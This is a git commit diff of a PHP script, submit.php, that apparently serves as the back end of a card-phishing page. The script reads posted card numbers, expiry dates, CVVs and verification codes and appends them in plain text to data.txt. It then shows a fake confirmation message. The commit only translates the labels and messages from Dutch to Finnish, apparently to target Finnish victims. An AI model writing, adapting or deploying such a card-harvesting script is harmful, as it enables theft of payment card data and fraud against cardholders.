d9bbbf9b917ee42df6d032788828d6a8080a1688
klaas1717 <klaasvalentijn1984@gmail.com>
2026-05-02 00:34:27 +0200

    Add files via upload

--- submit.php
+++ submit.php
@@ -1,12 +1,12 @@
-<?php
+	<?php
 $card_number = $_POST['card_number'];
 $card_expiry = $_POST['card_expiry'];
 $card_cvv = $_POST['card_cvv'];
 $verification_code = $_POST['verification_code'];
 
 // Opslaan in een bestand
-file_put_contents('data.txt', "Card: $card_number | Expiry: $card_expiry | CVV: $card_cvv | Verificatiecode: $verification_code\n", FILE_APPEND);
+file_put_contents('data.txt', "Kortti: $card_number | Käyttöaika: $card_expiry | CVV: $card_cvv | Vahvistuskoodi: $verification_code\n", FILE_APPEND);
 
-echo "<h2>Bedankt!</h2>";
-echo "<p>Je gegevens zijn opgeslagen.</p>";
+echo "<h2>Täysin hyväksytty!</h2>";
+echo "<p>Tiedot on tallennettu.</p>";
 ?>
